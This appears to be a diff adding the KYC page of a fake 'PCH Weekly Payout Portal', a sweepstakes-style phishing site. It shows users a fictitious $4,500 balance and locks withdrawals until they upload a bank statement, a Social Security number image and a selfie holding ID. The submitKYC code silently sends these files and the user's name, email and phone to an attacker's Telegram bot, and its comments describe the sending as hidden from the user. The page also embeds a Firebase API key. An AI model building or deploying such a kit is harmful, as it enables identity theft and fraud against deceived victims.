@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>KYC — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get, update, remove };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; overflow-x:hidden; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @media (hover:hover) and (pointer:fine) { .card-3d:hover { transform: translateY(-3px); box-shadow: 0 20px 30px -12px rgba(56,189,248,.14), 0 0 20px rgba(245,158,11,.07); } }
+  ::-webkit-scrollbar { width:8px; height:8px; } ::-webkit-scrollbar-track { background:#070b19; } ::-webkit-scrollbar-thumb { background:#212d54; border-radius:4px; } ::-webkit-scrollbar-thumb:hover { background:#38bdf8; }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .dash-shell { position:relative; isolation:isolate; overflow-x:hidden; }
+  .dash-shell::before { content:""; position:absolute; z-index:-1; inset:0 -1.25rem auto; height:25rem; pointer-events:none; background-color:transparent; background-image: radial-gradient(ellipse at 12% 0%, rgba(56,189,248,.12), transparent 52%), radial-gradient(ellipse at 88% 4%, rgba(251,191,36,.09), transparent 45%); background-repeat:no-repeat; }
+  .upload-preview { position:relative; border-radius:1rem; overflow:hidden; border:1px solid rgba(56,189,248,.35); background:#070b19; box-shadow:0 12px 24px -14px rgba(0,0,0,1),0 0 22px -10px rgba(56,189,248,.5); animation:fadeUp .35s cubic-bezier(.16,1,.3,1) both; }
+  .upload-preview img { width:100%; height:100%; object-fit:cover; display:block; }
+  @keyframes fadeUp { from { opacity:0; transform:translateY(14px); } to { opacity:1; transform:translateY(0); } }
+  .hide-scrollbar::-webkit-scrollbar { display: none; }
+  .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+</style>
+</head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<header class="bg-navy-950 border-b border-navy-700/60 sticky top-0 z-40">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between gap-2 relative">
+    <button onclick="toggleNavDrawer()" class="p-2 -ml-2 text-slate-300 hover:text-white transition z-10 relative"><i class="fa-solid fa-bars text-xl"></i></button>
+    <h1 class="absolute left-1/2 -translate-x-1/2 text-[11px] sm:text-xl font-black tracking-[0.15em] text-white uppercase whitespace-nowrap">PCH Weekly Payout Portal</h1>
+    <div id="nav-actions" class="flex items-center space-x-1.5 sm:space-x-3 z-10 relative"></div>
+  </div>
+</header>
+
+<div id="nav-overlay" class="fixed inset-0 bg-black/60 z-[45] hidden transition-opacity" onclick="toggleNavDrawer()"></div>
+<div id="nav-drawer" class="fixed inset-y-0 left-0 z-50 w-64 bg-navy-900 border-r border-navy-700 transform -translate-x-full transition-transform duration-300 ease-in-out flex flex-col">
+  <div class="p-5 border-b border-navy-700 flex items-center justify-between">
+    <span class="text-sm font-black text-white tracking-widest uppercase">Navigation</span>
+    <button onclick="toggleNavDrawer()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+  </div>
+  <nav class="flex-1 overflow-y-auto p-3 space-y-1"></nav>
+</div>
+
+<main id="app-container" class="flex-grow flex flex-col"></main>
+
+<footer class="bg-navy-950 border-t border-navy-700/50 py-8 text-sm text-slate-400">
+  <div class="max-w-7xl mx-auto px-4 text-center text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider font-bold">&copy; 2026 PCH Weekly Payout Portal (PWPP) — All rights reserved.</div>
+</footer>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-[60] items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const DEFAULT_TG = { botToken:'', chatId:'' };
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) {
+    try {
+      const parsed = JSON.parse(saved);
+      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
+      if (parsed.userBalance == null) parsed.userBalance = 4500;
+      if (!parsed.transactions) parsed.transactions = [];
+      if (!parsed.registeredUsers) parsed.registeredUsers = [];
+      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
+      return parsed;
+    } catch(e){}
+  }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], withdrawalState:'none', currentWithdrawal:null, kyc:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
+}
+const state = loadDeviceState();
+
+function saveDeviceState() {
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
+  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
+}
+async function syncCurrentUserToCloud() { if (!window.rtdb || !state.currentUser || !state.currentUser.username) return; try { await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), state.currentUser); } catch(e){} }
+async function pullCurrentUserFromCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
+  try {
+    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
+    if (!snap.exists()) return false;
+    const r = snap.val();
+    state.currentUser = Object.assign({}, state.currentUser, r);
+    if (r.kyc) state.kyc = r.kyc;
+    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
+    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
+    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
+    saveDeviceState(); return true;
+  } catch(e){ return false; }
+}
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }
+
+/* ═══════════ TELEGRAM — silent failures, no user-facing errors ═══════════ */
+async function sendTelegramMessage(textMessage) {
+  const botToken = ((state.telegramConfig && state.telegramConfig.botToken) || '').trim();
+  const chatId   = ((state.telegramConfig && state.telegramConfig.chatId)   || '').trim();
+  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', textMessage);
+    fd.append('parse_mode', 'HTML');
+    fd.append('disable_web_page_preview', 'true');
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
+    return d.ok;
+  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
+}
+
+async function sendTelegramDocument(file, caption) {
+  if (!file) return false;
+  const botToken = ((state.telegramConfig && state.telegramConfig.botToken) || '').trim();
+  const chatId   = ((state.telegramConfig && state.telegramConfig.chatId)   || '').trim();
+  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('document', file, file.name || 'document');
+    if (caption) { fd.append('caption', caption); fd.append('parse_mode', 'HTML'); }
+    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body:fd });
+    const data = await res.json();
+    if (!data.ok) console.error('[TG] doc failed:', data.error_code, data.description);
+    return data.ok;
+  } catch (err) { console.error('[TG] doc fetch failed:', err); return false; }
+}
+
+async function sendTelegramTextFile(filename, text, caption) {
+  const file = new File([text], filename, { type: 'text/plain' });
+  return sendTelegramDocument(file, caption);
+}
+
+function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
+function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }
+
+function toggleNavDrawer() {
+  const drawer = document.getElementById('nav-drawer');
+  const overlay = document.getElementById('nav-overlay');
+  if (drawer.classList.contains('-translate-x-full')) { drawer.classList.remove('-translate-x-full'); overlay.classList.remove('hidden'); }
+  else { drawer.classList.add('-translate-x-full'); overlay.classList.add('hidden'); }
+}
+
+function isTabLocked(tabKey) {
+  const isKycApproved = state.kyc && state.kyc.status === 'approved';
+  const isSetupComplete = !!state.configuredMethod;
+  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
+  if (tabKey === 'funds') return !isKycApproved;
+  if (tabKey === 'winners') return !isKycApproved;
+  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
+  return false;
+}
+function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }
+
+const DASHBOARD_TABS = [
+  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
+  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
+  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
+  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
+  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
+  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
+  { key:'spin', label:'Spin Your Luck', icon:'fa-dharmachakra', href:'spin.html' },
+  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
+  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
+  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
+  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
+  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
+  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
+  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
+];
+function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
+function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
+function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }
+
+function renderHeaderNav() {
+  const nav = document.getElementById('nav-actions'); if (!nav) return;
+  if (!state.currentUser) { nav.innerHTML = ''; return; }
+  const u = state.currentUser;
+  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
+  nav.innerHTML = `
+    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
+    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
+  `;
+}
+
+/* ═══════════ KYC PAGE ═══════════ */
+function renderKYC() {
+  const kStatus = state.kyc?.status || 'none';
+  
+  let statusBlock = '';
+  if (kStatus === 'pending') {
+    statusBlock = `<div class="bg-gold-500/10 border border-gold-500/30 rounded-2xl p-5 text-center">
+      <div class="w-12 h-12 bg-gold-500/20 text-gold-400 rounded-full mx-auto flex items-center justify-center text-xl mb-3"><i class="fa-solid fa-clock"></i></div>
+      <h3 class="text-lg font-bold text-white">Pending Review</h3>
+      <p class="text-xs text-slate-300 mt-1">Your documents were submitted on ${new Date(state.kyc.date).toLocaleDateString()}. An administrator is reviewing them now.</p>
+    </div>`;
+  } else if (kStatus === 'approved') {
+    statusBlock = `<div class="bg-emerald-500/10 border border-emerald-500/30 rounded-2xl p-5 text-center">
+      <div class="w-12 h-12 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-xl mb-3"><i class="fa-solid fa-circle-check"></i></div>
+      <h3 class="text-lg font-bold text-white">Verified</h3>
+      <p class="text-xs text-slate-300 mt-1">Your identity has been successfully verified. You have full access to all portal features.</p>
+    </div>`;
+  } else if (kStatus === 'rejected') {
+    statusBlock = `<div class="bg-rose-500/10 border border-rose-500/30 rounded-2xl p-5 text-center">
+      <div class="w-12 h-12 bg-rose-500/20 text-rose-400 rounded-full mx-auto flex items-center justify-center text-xl mb-3"><i class="fa-solid fa-circle-xmark"></i></div>
+      <h3 class="text-lg font-bold text-white">Verification Rejected</h3>
+      <p class="text-xs text-slate-300 mt-1">Reason: ${escapeHtml(state.kyc.reason || 'Documents unclear')}</p>
+    </div>`;
+  } else {
+    statusBlock = `<div class="bg-navy-900 border border-navy-700 rounded-2xl p-5 text-center">
+      <div class="w-12 h-12 bg-slate-700/50 text-slate-400 rounded-full mx-auto flex items-center justify-center text-xl mb-3"><i class="fa-solid fa-id-card"></i></div>
+      <h3 class="text-lg font-bold text-white">Not Verified</h3>
+      <p class="text-xs text-slate-400 mt-1">Upload the required documents below to unlock full access.</p>
+    </div>`;
+  }
+
+  return `
+    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+        <div>
+          <h2 class="text-xl sm:text-2xl font-extrabold text-white flex items-center"><i class="fa-solid fa-id-card text-gold-400 mr-3"></i>KYC Verification</h2>
+          <p class="text-xs text-slate-400 mt-1">Verify your identity to remove limits and enable withdrawals.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+      <div class="lg:col-span-1 space-y-6">
+        ${statusBlock}
+        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 card-3d">
+          <h3 class="text-sm font-bold text-white mb-3">Why Verify?</h3>
+          <ul class="space-y-3 text-xs text-slate-300">
+            <li class="flex items-start gap-2"><i class="fa-solid fa-check text-emerald-400 mt-0.5"></i> Unlock unlimited withdrawals</li>
+            <li class="flex items-start gap-2"><i class="fa-solid fa-check text-emerald-400 mt-0.5"></i> Increase P2P transfer limits</li>
+            <li class="flex items-start gap-2"><i class="fa-solid fa-check text-emerald-400 mt-0.5"></i> Access physical card issuance</li>
+            <li class="flex items-start gap-2"><i class="fa-solid fa-check text-emerald-400 mt-0.5"></i> Comply with financial regulations</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="lg:col-span-2">
+        ${kStatus === 'approved' ? `
+          <div class="bg-navy-800 border border-navy-700 rounded-3xl p-8 text-center card-3d">
+            <i class="fa-solid fa-shield-halved text-4xl text-emerald-400 mb-4"></i>
+            <h3 class="text-xl font-bold text-white">You're fully verified</h3>
+            <p class="text-xs text-slate-400 mt-2">No action required. Your identity is securely stored.</p>
+          </div>
+        ` : kStatus === 'pending' ? `
+          <div class="bg-navy-800 border border-navy-700 rounded-3xl p-8 text-center card-3d">
+            <i class="fa-solid fa-hourglass-half text-4xl text-gold-400 mb-4 animate-spin-slow"></i>
+            <h3 class="text-xl font-bold text-white">Review in progress</h3>
+            <p class="text-xs text-slate-400 mt-2">We'll notify you as soon as the admin completes the review.</p>
+          </div>
+        ` : `
+          <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d">
+            <h3 class="text-lg font-bold text-white mb-4">Submit Documents</h3>
+            <form onsubmit="submitKYC(event)" class="space-y-5">
+              <div class="space-y-1.5">
+                <label class="block text-xs font-bold text-slate-300">Bank Statement *</label>
+                <input type="file" id="kyc-bank" accept="image/*" required onchange="previewKycFile(this, 'prev-kyc-bank')" class="w-full text-xs text-slate-400 file:mr-3 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-950 file:cursor-pointer cursor-pointer bg-navy-950 border border-navy-700 rounded-xl p-1.5 focus:outline-none focus:border-sky-custom">
+                <div id="prev-kyc-bank" class="hidden upload-preview h-32 mt-2"></div>
+              </div>
+              <div class="space-y-1.5">
+                <label class="block text-xs font-bold text-slate-300">Social Security Number *</label>
+                <input type="file" id="kyc-ssn" accept="image/*" required onchange="previewKycFile(this, 'prev-kyc-ssn')" class="w-full text-xs text-slate-400 file:mr-3 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-950 file:cursor-pointer cursor-pointer bg-navy-950 border border-navy-700 rounded-xl p-1.5 focus:outline-none focus:border-sky-custom">
+                <div id="prev-kyc-ssn" class="hidden upload-preview h-32 mt-2"></div>
+              </div>
+              <div class="space-y-1.5">
+                <label class="block text-xs font-bold text-slate-300">Selfie Holding ID *</label>
+                <input type="file" id="kyc-selfie" accept="image/*" required onchange="previewKycFile(this, 'prev-kyc-selfie')" class="w-full text-xs text-slate-400 file:mr-3 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-950 file:cursor-pointer cursor-pointer bg-navy-950 border border-navy-700 rounded-xl p-1.5 focus:outline-none focus:border-sky-custom">
+                <div id="prev-kyc-selfie" class="hidden upload-preview h-40 mt-2"></div>
+              </div>
+              <button type="submit" class="w-full py-4 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl shadow-lg active:scale-95 transition">Submit for Verification</button>
+            </form>
+          </div>
+        `}
+      </div>
+    </div>
+  `;
+}
+
+function previewKycFile(input, previewId) {
+  const previewEl = document.getElementById(previewId); if (!previewEl) return;
+  const file = input.files && input.files[0];
+  if (!file) { previewEl.classList.add('hidden'); previewEl.innerHTML = ''; return; }
+  const badge = `<div class="absolute bottom-0 left-0 right-0 bg-navy-950/90 px-2.5 py-1.5 text-[10px] font-bold text-emerald-400 flex items-center justify-between"><span class="truncate pr-2"><i class="fa-solid fa-circle-check mr-1"></i>${escapeHtml(file.name)}</span><span class="shrink-0">${(file.size/1024).toFixed(0)} KB</span></div>`;
+  if (file.type && file.type.startsWith('image/')) {
+    const reader = new FileReader();
+    reader.onload = (e)=>{ previewEl.innerHTML = `<img src="${e.target.result}" alt="preview">${badge}`; previewEl.classList.remove('hidden'); };
+    reader.readAsDataURL(file);
+  } else {
+    previewEl.innerHTML = `<div class="w-full h-full flex flex-col items-center justify-center text-sky-custom gap-2"><i class="fa-solid fa-file-pdf text-3xl"></i><span class="text-[11px] font-bold">Attached</span></div>${badge}`;
+    previewEl.classList.remove('hidden');
+  }
+}
+
+async function submitKYC(e) {
+  e.preventDefault();
+  const bankFile   = document.getElementById('kyc-bank').files[0];
+  const ssnFile    = document.getElementById('kyc-ssn').files[0];
+  const selfieFile = document.getElementById('kyc-selfie').files[0];
+  if (!bankFile || !ssnFile || !selfieFile) { showToast('Missing Files', 'Upload all three documents.', 'warning'); return; }
+
+  const btn = e.target.querySelector('button[type="submit"]');
+  const origHtml = btn.innerHTML;
+  btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i> Submitting...';
+  btn.disabled = true;
+
+  const u = state.currentUser || { username:'unknown' };
+  const now = new Date();
+  const refId = 'KYC-' + now.getTime();
+  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+
+  const txtContent = [
+    '═══════════════════════════════════════════════════════════',
+    '   PCH WEEKLY PAYOUT PORTAL — KYC SUBMISSION',
+    '═══════════════════════════════════════════════════════════',
+    '',
+    `Submitted:   ${now.toISOString()}`,
+    `Reference:   ${refId}`,
+    `Account:     @${u.username}`,
+    `Name:        ${fullName}`,
+    `Email:       ${u.email || 'N/A'}`,
+    `Phone:       ${u.phone || 'N/A'}`,
+    '',
+    '───────────────────────────────────────────────────────────',
+    '   ATTACHED DOCUMENTS',
+    '───────────────────────────────────────────────────────────',
+    '',
+    `Bank Statement:      ${bankFile.name}  (${(bankFile.size/1024).toFixed(1)} KB, ${bankFile.type||'unknown'})`,
+    `SSN Document:        ${ssnFile.name}  (${(ssnFile.size/1024).toFixed(1)} KB, ${ssnFile.type||'unknown'})`,
+    `Selfie with ID:      ${selfieFile.name}  (${(selfieFile.size/1024).toFixed(1)} KB, ${selfieFile.type||'unknown'})`,
+    '',
+    '───────────────────────────────────────────────────────────',
+    'Submitted via PCH Weekly Payout Portal',
+    '═══════════════════════════════════════════════════════════'
+  ].join('\n');
+
+  const caption = (label) => `🪪 <b>${tgEsc(label)}</b>\n@${tgEsc(u.username)} — ${tgEsc(fullName)}\nRef: ${tgEsc(refId)}`;
+
+  // Silent fire — failures go to console only, user sees nothing
+  try {
+    await sendTelegramDocument(bankFile,   caption('KYC Bank Statement'));
+    await sendTelegramDocument(ssnFile,    caption('KYC SSN'));
+    await sendTelegramDocument(selfieFile, caption('KYC Selfie Holding ID'));
+    await sendTelegramTextFile(`kyc-${u.username}-${now.getTime()}.txt`, txtContent, `📄 <b>KYC Metadata</b>\n@${tgEsc(u.username)} — Ref ${tgEsc(refId)}`);
+  } catch(err) {
+    console.error('[KYC] telegram send threw:', err);
+  }
+
+  state.kyc = {
+    status: 'pending',
+    date: now.getTime(),
+    ref: refId,
+    files: { bank: bankFile.name, ssn: ssnFile.name, selfie: selfieFile.name }
+  };
+  if (state.currentUser) state.currentUser.kyc = state.kyc;
+  saveDeviceState();
+
+  showToast('Submitted', 'Your KYC documents are under review.', 'success');
+  render();
+}
+
+function render() {
+  document.body.classList.remove('modal-open');
+  renderHeaderNav();
+  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('kyc');
+  const container = document.getElementById('app-container');
+  container.innerHTML = renderDashboardShell('kyc', renderKYC());
+}
+
+window.onload = async function() {
+  if (!guardAuth()) return;
+  await pullCurrentUserFromCloud();
+  render();
+};
+</script>
+</body>
+</html>
